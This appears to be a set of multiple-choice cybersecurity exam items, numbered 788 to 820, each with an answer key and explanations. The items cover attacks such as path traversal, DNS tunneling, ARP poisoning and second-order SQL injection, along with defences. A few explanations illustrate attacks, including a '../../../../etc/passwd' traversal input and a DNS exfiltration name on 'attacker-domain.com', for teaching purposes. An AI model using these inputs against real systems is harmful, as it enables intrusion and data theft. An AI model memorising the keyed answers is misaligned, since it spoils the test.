  {id:788,domain:T,question:"What is a supply chain attack in the context of software development?",options:["An attack on physical shipping and logistics companies","An attack that compromises a trusted third-party component, library, update mechanism, or vendor in the software development/distribution pipeline to distribute malware to downstream users","An attack that disrupts product manufacturing","An attack targeting only hardware supply chains"],answer:1,explanation:"The SolarWinds attack compromised the build pipeline to insert malicious code into legitimate signed software updates, which were then trusted and installed by thousands of organizations — supply chain attacks are particularly dangerous because they exploit the inherent trust relationship between software vendors and their customers.",optionExplanations:["While the term originates from physical logistics, in cybersecurity it refers to the software/component delivery pipeline, not physical shipping.","Software supply chain attacks exploit trust in dependencies, build systems, or update mechanisms — a compromise upstream affects every downstream consumer of that software, creating massive blast radius from a single point of compromise.","This isn't about physical manufacturing; it specifically concerns software development and distribution processes.","Supply chain attacks span both hardware (e.g., implanted chips) and software (compromised code/updates), though software supply chain attacks have been more prevalent recently."]},
  {id:789,domain:A,question:"What is the purpose of DNS Security Extensions (DNSSEC)?",options:["Encrypting all DNS query traffic for confidentiality","Adding cryptographic signatures to DNS records to verify their authenticity and integrity, protecting against DNS spoofing and cache poisoning attacks by allowing resolvers to validate that responses haven't been tampered with","Speeding up DNS resolution times","Replacing DNS entirely with a new protocol"],answer:1,explanation:"DNSSEC uses a chain of trust with digital signatures (RRSIG records) from the root zone down to individual domains, allowing validating resolvers to cryptographically verify that a DNS response genuinely came from the authoritative source and wasn't altered in transit — note DNSSEC provides integrity/authenticity, not confidentiality (DNS queries remain visible; that's addressed separately by DNS over HTTPS/TLS).",optionExplanations:["DNSSEC provides authenticity and integrity, not confidentiality — queries are still visible in plaintext; DoH/DoT address the encryption gap.","DNSSEC's core purpose is enabling cryptographic validation of DNS data, directly countering cache poisoning and spoofing attacks that exploit DNS's original lack of authentication.","DNSSEC adds cryptographic overhead and can actually slightly increase response sizes/processing, rather than speeding up resolution.","DNSSEC is an extension that adds security features to the existing DNS protocol, not a complete replacement."]},
  {id:790,domain:G,question:"What is the difference between a vulnerability and an exploit?",options:["They are synonyms with no meaningful difference","A vulnerability is a weakness or flaw in a system that could potentially be exploited, while an exploit is the actual code, technique, or method used to take advantage of that vulnerability","An exploit is always more severe than a vulnerability","A vulnerability only exists in software, while an exploit only exists in hardware"],answer:1,explanation:"A vulnerability (e.g., an unpatched buffer overflow flaw, CVE-2024-XXXX) is the underlying weakness; the exploit is the working proof-of-concept or weaponized code that actually triggers and abuses that flaw to achieve a malicious outcome — a vulnerability can exist without a known exploit yet (theoretical risk) until someone develops one.",optionExplanations:["These terms describe distinct, related but separate concepts in the vulnerability lifecycle.","This distinction matters practically: vulnerability management tracks weaknesses to patch, while exploit availability (especially public/weaponized exploits) significantly raises urgency since the barrier to attack drops dramatically.","Severity is independent of whether something is labeled vulnerability vs exploit; a vulnerability can be critical even without a public exploit yet.","Both vulnerabilities and exploits can apply to software or hardware; the distinction is about flaw vs. the method of abuse, not the affected medium."]},
  {id:791,domain:O,question:"What is threat hunting?",options:["Hunting for new vendors to purchase threat intelligence from","A proactive security practice where analysts actively search for hidden threats or indicators of compromise within a network that have evaded existing automated detection tools, rather than waiting for alerts","A physical security patrol of server rooms","Hunting down employees who violate security policy"],answer:1,explanation:"Threat hunters form hypotheses (e.g., 'could an attacker be using PsExec for lateral movement undetected?') and proactively query logs, endpoint telemetry, and network data to test them, often uncovering sophisticated or long-dwelling threats that signature-based and rule-based detection missed entirely.",optionExplanations:["This isn't about vendor procurement; it's an active, analyst-driven detection methodology.","Threat hunting assumes that determined attackers may already be inside undetected and proactively searches for subtle evidence rather than passively waiting for automated alerts, addressing detection gaps in reactive security models.","This is a cybersecurity analytical practice, not physical security patrol activity.","This isn't about disciplinary action against employees; it's about searching for malicious actors/activity within the technical environment."]},
  {id:792,domain:T,question:"What is a privilege escalation attack?",options:["An attack that increases a company's security budget","A technique where an attacker who has gained limited access to a system exploits a vulnerability or misconfiguration to gain higher-level permissions than originally granted, such as moving from standard user to administrator/root","Promoting an employee to a higher position", "An attack that escalates the volume of network traffic"],answer:1,explanation:"Vertical privilege escalation moves from a lower privilege level to a higher one (user to admin), often via unpatched kernel exploits or misconfigured services, while horizontal escalation accesses another user's resources at the same privilege level — both are critical steps attackers take after initial foothold to achieve their objectives.",optionExplanations:["Budget is a business/financial concept, unrelated to technical access escalation.","Privilege escalation is a critical phase in the attack chain, allowing attackers to move from limited initial access to full system/domain control, often by exploiting unpatched vulnerabilities or misconfigurations.","This describes legitimate HR promotion, not unauthorized technical access escalation.","This isn't a traffic volume attack; it's about gaining unauthorized elevated system permissions."]},
  {id:793,domain:A,question:"What is the purpose of redundant array of independent disks (RAID) in the context of availability?",options:["RAID is used only for data encryption","A storage technology that combines multiple physical disks to provide data redundancy, improved performance, or both, helping ensure availability if one disk fails","RAID prevents all forms of data loss including ransomware","RAID is a backup replacement requiring no other data protection"],answer:1,explanation:"RAID 1 (mirroring) and RAID 5/6 (striping with parity) allow a system to continue operating and data to remain accessible even if one (or more, depending on RAID level) physical disk fails — but RAID is not a backup, since it doesn't protect against accidental deletion, ransomware encryption, or site-level disasters that backups and DR plans address.",optionExplanations:["RAID is unrelated to encryption; it's purely a storage redundancy/performance technology.","RAID directly supports the availability pillar of the CIA triad by allowing continued operation through disk-level hardware failures, though it addresses only this specific failure mode.","RAID has no protection against ransomware, logical corruption, or accidental deletion — those changes get written/mirrored across all disks identically, making proper backups still essential.","RAID is explicitly not a substitute for backups since it doesn't protect against logical data loss, deletion, or site disasters — separate backup and DR strategies remain necessary."]},
  {id:794,domain:T,question:"What is a directory traversal (path traversal) attack?",options:["An attack on physical building directories", "An attack exploiting insufficient input sanitization to access files and directories outside the intended restricted directory, often using sequences like '../' to navigate the file system", "A phone book scanning technique","An attack that traverses network routing tables"],answer:1,explanation:"Example: a vulnerable file download feature accepting ?file=report.pdf could be exploited with ?file=../../../../etc/passwd to access files far outside the intended download directory — proper input validation, allowlisting, and running with least-privilege file system permissions are key defenses.",optionExplanations:["This is a digital file system exploitation technique, not related to physical building navigation.","Path traversal exploits applications that build file paths from user input without properly restricting access to a designated directory, allowing attackers to read (or sometimes write) arbitrary files on the server.","This isn't related to phone directories; it's a web/file system security vulnerability.","This targets the file system hierarchy of a server, not network routing infrastructure."]},
  {id:795,domain:P,question:"What is the purpose of a Statement of Work (SOW) in vendor security engagements?",options:["A statement listing only the vendor's marketing claims","A formal document detailing the specific scope, deliverables, timeline, responsibilities, and terms of a vendor engagement, ensuring both parties have clear, agreed-upon expectations","A statement of the vendor's annual revenue","A general non-disclosure agreement template"],answer:1,explanation:"For a penetration test engagement, the SOW would specify exact systems in scope, testing methodology, deliverable format (report structure), timeline, and payment terms — providing a contractual basis for what work will be performed and preventing scope disputes after the engagement begins.",optionExplanations:["Marketing claims aren't the purpose; an SOW is a binding scope and deliverables document.","SOWs establish clear, mutually-agreed expectations for vendor engagements, reducing ambiguity and providing a reference point if disputes arise about what was actually agreed to be delivered.","Financial information about the vendor is unrelated to defining the scope of a specific engagement.","NDAs are a separate, distinct legal document focused on confidentiality, not on the scope and deliverables of the work itself."]},
  {id:796,domain:T,question:"What is typosquatting?",options:["A competitive typing speed contest","Registering domain names that are intentional misspellings or variations of legitimate, popular domains to capture mistyped traffic, often for phishing or malvertising purposes","A vulnerability in autocorrect software","An attack against domain name registrars"],answer:1,explanation:"An attacker might register 'gooogle.com' or 'arnazon.com' to capture users who mistype the intended URL — visitors might be served phishing pages mimicking the legitimate site, malicious ads, or have the domain sold back to the legitimate company at inflated prices.",optionExplanations:["This isn't a recreational activity; it's a malicious domain registration technique.","Typosquatting exploits common typing errors to redirect unsuspecting users to malicious or monetized look-alike domains, capitalizing on the high traffic volume of popular sites.","This isn't an autocorrect software flaw; it's deliberate exploitation of human typing mistakes via domain registration.","This isn't an attack on registrars themselves; it's the malicious use of legitimate domain registration services."]},
  {id:797,domain:O,question:"What is the purpose of an after-action report following a security incident?",options:["A report used only for insurance claims","A formal document summarizing the incident timeline, response actions taken, root cause, impact, and recommendations for improvement, serving as an official record and input for process improvement","A report listing all employees who worked overtime","A daily status report sent during active business operations"],answer:1,explanation:"After-action reports are more formal and comprehensive than lessons-learned meeting notes, often required for compliance/legal purposes and executive reporting — they document what happened, why, the response effectiveness, and concrete remediation action items with owners and deadlines.",optionExplanations:["While insurance claims may reference it, the AAR's primary purpose is comprehensive incident documentation and process improvement, with broader uses beyond insurance.","AARs create an official, comprehensive record that supports compliance requirements, legal needs, executive communication, and most importantly, drives concrete improvements to prevent recurrence.","Overtime tracking is an HR/payroll concern, unrelated to incident documentation.","AARs are produced after incident resolution as a retrospective document, not a real-time operational status update."]},
  {id:798,domain:A,question:"What is the purpose of an Application Programming Interface (API) gateway in security architecture?",options:["A gateway used only for physical building access","A centralized entry point for API traffic that enforces authentication, rate limiting, request validation, and monitoring policies before requests reach backend microservices","A gateway that translates programming languages","A backup system for API documentation"],answer:1,explanation:"API gateways (Kong, Apigee, AWS API Gateway) centralize cross-cutting security concerns — API key/OAuth token validation, rate limiting to prevent abuse, request/response transformation, and logging — so individual microservices don't each need to reimplement these controls, while also providing a single point for monitoring and threat detection across all API traffic.",optionExplanations:["This is a software/network architecture component, unrelated to physical access control.","API gateways centralize security enforcement for distributed microservice architectures, providing consistent authentication, authorization, and abuse prevention without burdening each individual service with redundant security logic.","API gateways manage traffic and policy enforcement, not language translation/compilation.","This is an active traffic management/security component, not a documentation backup system."]},
  {id:799,domain:T,question:"What is a deauthentication attack against wireless networks?",options:["An attack that prevents users from ever connecting to WiFi", "An attack sending spoofed deauthentication frames to forcibly disconnect a client from a wireless access point, often used to capture WPA handshakes for offline cracking or to facilitate evil twin attacks", "A legitimate network administration tool for managing connections", "An attack against wired Ethernet authentication"],answer:1,explanation:"Because 802.11 management frames were historically unauthenticated/unencrypted, an attacker can spoof deauth frames appearing to come from the AP, forcing a client to disconnect and reconnect — capturing the WPA/WPA2 4-way handshake during reconnection for offline password cracking, or as a denial-of-service/precursor to an evil twin attack. 802.11w (Protected Management Frames) mitigates this.",optionExplanations:["Deauth attacks force temporary, targeted disconnections rather than permanently preventing any future connection.","This attack exploits the historical lack of authentication on 802.11 management frames, enabling both DoS and as a stepping stone to credential capture or MITM attacks via forced reconnection.","While legitimate deauth frames exist for normal disconnection, this attack uses spoofed frames maliciously without authorization, distinguishing it from legitimate network management.","This specifically targets 802.11 wireless protocols' management frame handling, not wired Ethernet authentication mechanisms."]},
  {id:800,domain:G,question:"What is the purpose of the CIA triad in information security?",options:["A reference to the Central Intelligence Agency's security standards","A foundational model representing the three core objectives of information security: Confidentiality, Integrity, and Availability, used to guide security policy and control selection","A triad of three required security certifications","A model describing three types of cyberattacks"],answer:1,explanation:"Confidentiality ensures data is only accessible to authorized parties (encryption, access control), Integrity ensures data hasn't been improperly altered (hashing, digital signatures), and Availability ensures systems/data are accessible when needed (redundancy, DDoS protection) — virtually every security control can be mapped to supporting one or more of these three objectives.",optionExplanations:["This is purely a naming coincidence; the CIA triad is unrelated to the intelligence agency.","The CIA triad is the most fundamental conceptual framework in security, used to evaluate risks and justify controls by asking which of the three objectives a given threat or control affects.","This isn't about certifications; it's a conceptual security objectives framework.","The triad describes security goals/objectives to protect, not categories of attacks (though attacks can be classified by which CIA principle they violate)."]},
  {id:801,domain:O,question:"What is the purpose of network traffic baselining?",options:["Establishing a fixed maximum bandwidth limit","Establishing a profile of what 'normal' network traffic patterns look like (volume, protocols, destinations, timing) so that anomalies and deviations can be more easily detected","Setting the lowest acceptable network speed","A one-time network performance test during installation"],answer:1,explanation:"Once a baseline is established (e.g., normal traffic to a specific server averages 50GB/day on HTTPS), anomaly detection tools can flag deviations like a sudden 500GB outbound transfer at 3 AM as suspicious — without a baseline, abnormal activity may blend into the noise of 'normal' unanalyzed traffic.",optionExplanations:["Baselining is about understanding typical patterns for anomaly detection, not setting hard bandwidth caps.","Baselines provide the reference point necessary for behavioral/anomaly-based detection — without knowing what's normal, it's very difficult to algorithmically identify what's abnormal or suspicious.","This isn't about minimum speed requirements; it's about characterizing typical traffic behavior.","Effective baselining is ongoing and continuously updated, since 'normal' traffic patterns evolve over time as business needs change."]},
  {id:802,domain:T,question:"What is a DNS tunneling attack?",options:["An attack that physically taps into DNS server fiber optic cables", "A technique encoding data (such as command-and-control traffic or exfiltrated data) within DNS queries and responses, exploiting the fact that DNS traffic is often allowed through firewalls with minimal inspection", "A method to speed up DNS resolution","An attack that corrupts DNS zone transfer files"],answer:1,explanation:"Because DNS is essential for normal operation and often permitted outbound with limited inspection, attackers encode malware C2 commands or stolen data into DNS query subdomains (e.g., stolen-data-chunk1.attacker-domain.com) — DNS tunneling tools like Iodine or DNSCat2 can establish a covert communication channel that bypasses traditional firewall/proxy controls.",optionExplanations:["This is a logical/protocol-level technique, not physical infrastructure tampering.","DNS tunneling exploits the trust and minimal inspection typically given to DNS traffic to covertly transmit data, making it an effective technique for C2 communication and data exfiltration that evades many traditional network controls.","Tunneling adds overhead and complexity, making it slower than normal DNS resolution, not faster.","This is about covert data channels within DNS query/response traffic, not corrupting legitimate zone transfer data."]},
  {id:803,domain:A,question:"What is the purpose of a load balancer in availability architecture?",options:["A device that physically weighs server hardware", "A system that distributes incoming network traffic across multiple servers to optimize resource use, maximize throughput, minimize response time, and ensure no single server becomes a point of failure", "A tool used only for testing server capacity limits","A device that reduces the total number of servers needed"],answer:1,explanation:"Load balancers (F5, AWS ELB, NGINX) distribute traffic using algorithms like round-robin or least-connections, and perform health checks to automatically route traffic away from failed/unhealthy servers — this provides both performance benefits and availability resilience since the failure of one backend server doesn't cause an outage.",optionExplanations:["This is wordplay on 'load'; it refers to network/computational traffic distribution, not physical weight.","Load balancers improve both performance (distributing demand) and availability (automatic failover from unhealthy nodes), making them a critical component of resilient, scalable architectures.","While load testing can use similar traffic patterns, the load balancer's primary production purpose is ongoing traffic distribution, not testing.","Load balancers often work with multiple servers to provide redundancy; reducing server count would actually reduce the availability benefits they provide."]},
  {id:804,domain:O,question:"What is the purpose of conducting a business impact analysis (BIA)?",options:["Analyzing only the financial profitability of a business unit","A process identifying and evaluating the potential effects of disruptions to critical business operations, helping prioritize recovery efforts and determine acceptable downtime (RTO) and data loss (RPO) targets","Analyzing employee job satisfaction","A one-time technical penetration test report"],answer:1,explanation:"A BIA identifies critical business processes (e.g., order processing, payment systems), quantifies the impact of their disruption over time (financial loss, reputational damage, regulatory penalties), and uses this analysis to set RTO/RPO targets that then drive disaster recovery and business continuity planning priorities and budget allocation.",optionExplanations:["BIA considers broader business continuity impact, not solely financial profitability metrics.","BIA is foundational to business continuity/disaster recovery planning — it provides the data-driven justification for RTO/RPO targets and prioritizes which systems need the most robust (and costly) resilience investments.","Employee satisfaction is an HR metric, unrelated to business continuity impact analysis.","BIA is a business continuity planning process, not a technical security testing activity like a penetration test."]},
  {id:805,domain:T,question:"What is a SQL injection second-order attack?",options:["A SQL injection attack that occurs exactly twice","An attack where malicious input is stored safely at first (e.g., in a database) but later retrieved and used in a different, vulnerable SQL query without proper sanitization, triggering the injection at a delayed point","An attack targeting the second database server in a cluster","A backup SQL injection technique used if the first fails"],answer:1,explanation:"Example: a user registers with a username containing SQL metacharacters that pass initial input validation (since it's just stored as a string), but later, when an admin panel queries 'SELECT * FROM logs WHERE user=' + storedUsername without parameterization, the injection executes — the delayed execution path makes second-order injection harder to detect with simple input testing.",optionExplanations:["'Second-order' refers to the delayed execution path, not the number of occurrences.","Second-order SQL injection is dangerous specifically because the initial input handling may appear safe, while the vulnerability surfaces later when that stored data is used unsafely in a different context/query.","This isn't about targeting specific database server instances; it's about the timing/path of when malicious input triggers the injection.","This describes a distinct attack technique based on delayed exploitation, not a fallback method."]},
  {id:806,domain:P,question:"What is the purpose of a privacy impact assessment (PIA)?",options:["Assessing only the financial cost of privacy software","A systematic process evaluating how a new project, system, or process collects, uses, and protects personal data, identifying privacy risks before implementation to ensure compliance and minimize harm","A performance review for the privacy officer","An assessment conducted only after a data breach occurs"],answer:1,explanation:"PIAs (required under GDPR as DPIAs for high-risk processing) are conducted proactively during system design — they identify what personal data will be collected, why, how it will be protected, and whether less privacy-invasive alternatives exist, embodying the privacy-by-design principle rather than retrofitting privacy after deployment.",optionExplanations:["PIA evaluates privacy risk comprehensively, not narrowly focused on software costs.","PIAs operationalize 'privacy by design' by requiring risk evaluation before systems are built/deployed, when changes are far cheaper to make than after a system handling personal data is already in production.","This isn't an HR performance evaluation; it's a risk assessment of a system or process design.","PIAs are explicitly proactive/preventive assessments conducted before implementation, not reactive breach investigations."]},
  {id:807,domain:T,question:"What is an ARP cache poisoning attack?",options:["Physically damaging network router hardware","An attack where an attacker sends falsified ARP messages to associate their MAC address with the IP address of another host (often the default gateway), enabling traffic interception via man-in-the-middle positioning","An attack that corrupts DNS server cache entries","A technique to clear browser cache remotely"],answer:1,explanation:"Because ARP has no built-in authentication, an attacker can broadcast spoofed ARP replies claiming their MAC address corresponds to the gateway's IP — victim devices update their ARP cache and send traffic intended for the gateway to the attacker instead, who can then intercept, modify, or relay it (MITM) — Dynamic ARP Inspection (DAI) on switches is a key defense.",optionExplanations:["ARP poisoning is a logical/protocol attack, not physical hardware damage.","ARP's lack of authentication is the root vulnerability exploited — attackers can freely associate any MAC with any IP in victims' ARP caches, enabling local network traffic interception.","This targets the local network's ARP protocol/Layer 2, distinct from DNS cache poisoning which operates at a different layer/protocol.","This isn't about browser cache; ARP poisoning operates at the network/data link layer of local network communication."]},
  {id:808,domain:A,question:"What is the purpose of a content delivery network (CDN) from a security perspective?",options:["A CDN exists purely for content licensing purposes","A geographically distributed network of servers caching and delivering content closer to users, which can also absorb and mitigate large-scale DDoS attacks due to its distributed capacity and provide WAF capabilities at the edge","A CDN that only delivers video content","A network used exclusively for internal corporate communications"],answer:1,explanation:"CDNs like Cloudflare and Akamai distribute massive amounts of capacity globally, which can absorb volumetric DDoS attacks that would overwhelm a single origin server — many CDNs also offer integrated WAF and bot mitigation services at the edge, filtering malicious traffic before it ever reaches the origin infrastructure.",optionExplanations:["Licensing is a separate business/legal concern; CDN's technical function relates to content delivery and security.","Beyond performance benefits, CDNs provide significant security value through distributed capacity (DDoS absorption) and edge security services (WAF, bot management) that protect origin infrastructure.","CDNs deliver various content types (web pages, images, video, APIs), not exclusively video.","CDNs are specifically designed for external, public-facing content delivery to end users across the internet, not internal-only communications."]},
  {id:809,domain:O,question:"What is the purpose of an incident severity classification system?",options:["Classifying incidents based only on the attacker's nationality","A standardized framework for categorizing incidents by their potential impact and urgency (e.g., Critical, High, Medium, Low), guiding appropriate resource allocation, escalation procedures, and response timelines","Classifying incidents alphabetically by name","A system used only for compliance reporting, not actual response"],answer:1,explanation:"Severity classification (often based on factors like data sensitivity affected, system criticality, and scope) ensures a ransomware attack on the primary domain controller gets immediate all-hands response while a single isolated phishing email triggers standard, less urgent handling — without this triage, organizations risk either under-responding to critical incidents or wasting resources over-responding to minor ones.",optionExplanations:["Attacker attribution isn't a factor in severity classification; impact and urgency are the key criteria.","Severity classification enables proportional, efficient resource allocation — ensuring the most critical incidents receive immediate executive attention and resources while less severe ones follow standard procedures.","Classification is based on impact/urgency criteria, not alphabetical organization, which would be meaningless for prioritization.","Severity classification directly drives real-time operational response decisions (escalation, resource allocation), not merely after-the-fact compliance documentation."]},
  {id:810,domain:T,question:"What is a watering hole versus spear phishing — what's the key distinguishing factor?",options:["There is no difference between these two attacks","Spear phishing directly targets specific individuals via deceptive communications (email), while a watering hole attack compromises a third-party site the targets are known to visit, waiting for them to come to the attacker rather than reaching out directly","Watering hole attacks only target government websites","Spear phishing is always less effective than watering hole attacks"],answer:1,explanation:"Spear phishing is an active, direct approach (crafting a convincing email to a specific person), while watering hole is a passive, indirect approach (compromising a site and waiting) — attackers may choose watering hole when direct targeting (email/social engineering) is difficult due to a hardened target who is unlikely to fall for direct phishing attempts.",optionExplanations:["These attacks have fundamentally different methodologies and threat models, despite both aiming at specific targets.","The key distinction is direct outreach (spear phishing) versus indirect compromise-and-wait (watering hole) — this matters for defense, since watering hole attacks bypass email security controls entirely by exploiting trusted third-party browsing.","Watering hole attacks can target any site frequented by the intended victims — industry forums, vendor sites, news outlets — not exclusively government sites.","Effectiveness depends on context; watering hole attacks can be highly effective specifically against targets resistant to direct phishing, while spear phishing is highly effective against less security-aware targets — neither is universally superior."]},
  {id:811,domain:G,question:"What is the principle of least functionality in system hardening?",options:["Configuring systems to use the least amount of electricity","Configuring a system to provide only the essential capabilities required for its function, disabling or removing unnecessary services, ports, protocols, and software to reduce the attack surface","Limiting how many users can access a system simultaneously","Reducing the physical size of server hardware"],answer:1,explanation:"A web server hardened with least functionality would have unnecessary services (FTP, Telnet, unused database engines) disabled, unused ports closed, and unneeded software uninstalled — every running service is a potential vulnerability and attack vector, so removing what isn't needed directly shrinks the attack surface.",optionExplanations:["This is about functional capability minimization for security, not power consumption.","Least functionality is a core hardening principle alongside least privilege — fewer running services and open ports mean fewer potential vulnerabilities for attackers to exploit.","User count limiting is a capacity/licensing concern, not the security hardening principle of minimizing system capabilities.","Physical hardware size is unrelated to the software/service configuration hardening principle."]},
  {id:812,domain:O,question:"What is the purpose of file integrity monitoring (FIM)?",options:["Monitoring how full a file storage disk is","A security control that tracks and alerts on unauthorized changes to critical system files, configuration files, or directories by comparing current file hashes/attributes against a known-good baseline","Monitoring file download speeds","A backup tool that copies files to a secondary location"],answer:1,explanation:"FIM tools (Tripwire, OSSEC) calculate cryptographic hashes of critical files (system binaries, configuration files like /etc/passwd) and alert when changes are detected — since malware and attackers often modify system files for persistence or to disable security controls, unexpected changes are a strong indicator of compromise.",optionExplanations:["Disk capacity monitoring is a different operational concern from detecting unauthorized file changes.","FIM provides change detection for critical files specifically as a tamper/compromise indicator — many compliance frameworks (PCI DSS) explicitly require FIM on systems handling sensitive data.","Download speed monitoring is a performance metric, unrelated to integrity verification.","Backup is data protection through copying, distinct from FIM's purpose of detecting unauthorized modifications."]},
  {id:813,domain:T,question:"What is a downgrade attack in the context of cryptographic protocols?",options:["An attack that physically downgrades server hardware specifications","An attack that forces a system to use a weaker, older, or less secure version of a protocol or cipher suite (such as forcing TLS 1.0 instead of TLS 1.3), exploiting weaknesses in the older standard","An attack that reduces an employee's account privileges","A social engineering attack targeting IT downgrades during budget cuts"],answer:1,explanation:"The POODLE attack exploited downgrade behavior to force connections to fall back to SSL 3.0, which had known vulnerabilities, even when both client and server supported more secure TLS versions — defenses include disabling legacy protocol/cipher support entirely and implementing protocol version pinning where possible (e.g., TLS_FALLBACK_SCSV).",optionExplanations:["This is a protocol-level attack on cryptographic negotiation, not physical hardware specification changes.","Downgrade attacks specifically target the negotiation phase of cryptographic protocols, forcing fallback to weaker, exploitable versions — disabling legacy protocol support is the primary mitigation.","This isn't about user account privilege changes; it's about cryptographic protocol version manipulation.","This is a technical cryptographic attack, not a social engineering or budget-related concept despite the similar word 'downgrade.'"]},
  {id:814,domain:A,question:"What is the purpose of geofencing in mobile device security?",options:["Building a physical fence around a data center","A security control that uses GPS or location data to restrict or trigger specific actions based on a device's physical location, such as disabling certain features outside an approved geographic area","Encrypting GPS coordinate data only","A fence used to block wireless signals"],answer:1,explanation:"Organizations might configure MDM policies to automatically lock a device or disable camera/data access when it leaves an approved geographic boundary (e.g., a hospital's campus), or conversely trigger enhanced security requirements when a device is detected in a high-risk country — geofencing adds a location-based contextual layer to access and security policies.",optionExplanations:["This is a software/policy-based location control, not physical perimeter fencing.","Geofencing enables location-aware security policies, allowing organizations to apply different security postures or restrictions based on where a device physically is, adding context to risk-based access decisions.","Geofencing uses location data to trigger policy actions; it's not specifically about encrypting the coordinate data itself.","This is unrelated to RF signal blocking (which would be a Faraday cage); geofencing is a software-based location policy mechanism."]},
  {id:815,domain:O,question:"What is the purpose of conducting regular access reviews (user access recertification)?",options:["Reviewing only new employee access during onboarding","A periodic process where managers or system owners verify that users' current access rights are still appropriate and necessary for their job role, identifying and removing excessive or unused permissions (privilege creep)","Reviewing the physical appearance of access badges","A one-time review conducted only during a security audit"],answer:1,explanation:"Privilege creep occurs as employees change roles over time, often accumulating access rights from previous positions that are never revoked — regular (e.g., quarterly) access reviews catch this drift, ensuring the principle of least privilege is maintained over time rather than only at initial provisioning.",optionExplanations:["Access reviews specifically focus on existing, ongoing access for current employees, not just new hire onboarding.","Regular recertification directly counters privilege creep, ensuring access rights remain aligned with current job responsibilities over time rather than accumulating unchecked.","This is about logical access permissions, not physical badge appearance/condition.","Effective access governance requires ongoing periodic reviews, not just point-in-time audit-driven checks, to catch drift as it occurs."]},
  {id:816,domain:T,question:"What is a Business Email Compromise (BEC) attack?",options:["Any email sent from a business account","A sophisticated social engineering attack where attackers impersonate executives or trusted business partners via email to trick employees into making fraudulent wire transfers or revealing sensitive information","An attack that physically compromises business email servers","A spam filtering technique used by businesses"],answer:1,explanation:"BEC attacks often involve researching an organization (via LinkedIn, press releases) to identify the right executive to impersonate, then sending urgent, plausible requests (e.g., 'I need this wire transfer processed immediately, I'm in a meeting') to finance staff — BEC causes billions in losses annually and often bypasses technical controls since it relies purely on social engineering rather than malware.",optionExplanations:["BEC refers specifically to a targeted fraud technique, not just any business-related email.","BEC is highly effective and costly because it exploits human trust and urgency rather than technical vulnerabilities, often bypassing spam filters since the emails contain no malicious links or attachments — just compelling social engineering text.","This isn't a server compromise technique; it's primarily a social engineering/impersonation attack via email content.","This describes a defensive technology, the opposite of the BEC attack technique itself."]},
  {id:817,domain:A,question:"What is the purpose of an air-gapped network?",options:["A network that uses only wireless connections", "A network that is physically isolated from unsecured networks, including the internet, with no physical or wireless connection, used to protect highly sensitive systems from remote attacks", "A network with extra space between server racks for cooling","A backup network used during outages"],answer:1,explanation:"Air-gapped networks (used for industrial control systems, classified government networks, or nuclear facility controls) eliminate remote network-based attack vectors entirely — but they're not immune to all threats, as demonstrated by Stuxnet, which crossed the air gap via infected USB drives, showing that physical/removable media controls remain critical even in air-gapped environments.",optionExplanations:["Air-gapping is about physical isolation/disconnection, the opposite of wireless connectivity.","Air gaps provide strong protection against remote network attacks by physically eliminating any network connection path, though they require strict physical and removable media controls to remain effective.","This is a network security architecture concept, not a physical cooling/spacing consideration.","Air-gapped networks are typically dedicated, isolated production networks for highly sensitive operations, not backup/failover networks."]},
  {id:818,domain:T,question:"What is an insider threat?",options:["Any threat originating from a foreign country","A security risk posed by individuals within an organization (employees, contractors, business partners) who have authorized access and may intentionally or unintentionally cause harm to the organization's security","A vulnerability found only in internal-use software","A threat that only affects internal company communications"],answer:1,explanation:"Insider threats can be malicious (a disgruntled employee stealing data before leaving), negligent (an employee falling for phishing or misconfiguring a cloud bucket), or compromised (an external attacker using stolen insider credentials) — insider threats are particularly dangerous because the individual already has legitimate, trusted access, bypassing many perimeter-focused defenses.",optionExplanations:["Insider threats specifically originate from within the organization, regardless of nationality — the defining factor is authorized internal access.","Insider threats are uniquely challenging because they originate from trusted, authorized individuals, requiring different detection approaches (behavioral analytics, UEBA) than external attacker-focused perimeter defenses.","This isn't specifically about software vulnerabilities; it's about risk from people with legitimate organizational access.","Insider threats can affect any organizational asset (data, systems, physical security), not just internal communications specifically."]},
  {id:819,domain:O,question:"What is the purpose of a disaster recovery (DR) test?",options:["A test conducted only after an actual disaster occurs","A planned, periodic exercise validating that an organization's disaster recovery plan and procedures actually work as documented, identifying gaps before a real disaster strikes","A test of employees' physical disaster preparedness knowledge only","A one-time test performed only when the DR plan is first written"],answer:1,explanation:"DR tests range from tabletop walkthroughs to full failover tests (actually cutting over to a DR site) — regularly scheduled testing (annually at minimum, often more frequently for critical systems) catches issues like outdated runbooks, missing dependencies, or failed backups before they're discovered during an actual crisis when the stakes are highest.",optionExplanations:["Testing the plan is meant to happen proactively, before a disaster, specifically to ensure readiness when one does occur.","Regular DR testing validates that documented procedures, technical failover mechanisms, and team readiness actually function correctly, surfacing gaps in a controlled setting rather than during a real, high-stakes crisis.","While awareness is part of it, DR tests primarily validate technical recovery capabilities and procedures, not solely employee general knowledge.","DR plans and the environment they protect change over time, requiring ongoing periodic testing to remain valid and effective."]},
  {id:820,domain:T,question:"What is a side-channel attack?",options:["An attack launched from a side/secondary network connection","An attack that exploits information gained from the physical implementation of a system (timing, power consumption, electromagnetic emissions, or sound) rather than exploiting weaknesses in the algorithm itself","An attack that targets only side menus in web applications","A backup attack method used if the primary attack fails"],answer:1,explanation:"Timing attacks measure how long cryptographic operations take to infer information about secret keys; power analysis attacks measure a smart card's power consumption during encryption to extract key bits; Spectre/Meltdown exploited CPU speculative execution timing — side-channel attacks bypass the mathematical strength of an algorithm entirely by exploiting its physical implementation.",optionExplanations:["This isn't about network topology/connection paths; it's about exploiting unintended physical information leakage.","Side-channel attacks are notable because they can defeat cryptographically sound algorithms by exploiting implementation-specific physical leakage (timing, power, EM emissions) rather than any mathematical weakness in the algorithm itself.","This isn't about UI elements; it's a hardware/implementation-level attack against the physical execution of cryptographic or computational processes.","This is a distinct, sophisticated attack category exploiting physical implementation details, not a fallback technique."]},
